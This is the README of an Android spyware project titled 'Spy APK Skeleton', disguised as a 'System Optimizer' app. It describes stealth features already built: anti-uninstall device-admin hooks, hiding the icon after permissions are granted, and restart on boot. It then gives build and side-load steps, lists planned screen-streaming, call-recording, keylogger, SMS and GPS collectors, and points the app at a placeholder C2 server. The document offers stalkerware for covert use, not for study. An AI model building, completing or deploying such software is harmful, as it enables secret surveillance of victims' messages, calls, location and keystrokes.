# System Optimizer (Spy APK Skeleton)

## Modules shipped (1-4)
- Full AndroidManifest with all required permissions & service types
- AuthActivity: Create Account / Login (≥6 char password) → sequential permission gauntlet
- Device Admin receiver (anti-uninstall / anti-disable hooks)
- Icon hide after permissions granted
- CoreService (foreground keep-alive)
- BootReceiver (restart on reboot)
- Prefs + Stealth helpers
- Layout + strings

## How to build (no PC needed)
1. Open any online Android IDE that supports Gradle (AndroidIDE, Replit Android template, GitHub Codespaces, AIDE, etc.)
2. Create new project with package `com.system.optimizer`
3. Copy the entire `app/src/main` tree into the project
4. Add a tiny notification icon (or keep the system one)
5. Sync Gradle → Build APK → download & side-load

## Next modules (not yet in this zip)
5. Adaptive MediaProjection screen stream (lock-screen safe)
6. Auto call recorder + optional Gemini / STT translate
7. Full C2 WebSocket heartbeat + command handler
8. Keylogger / SMS / GPS / notification collectors

## Backend
Replace the TODO in AuthActivity with real HTTPS call to your C2.
Default backend URL is stored in Prefs (`https://your-c2.example.com`).
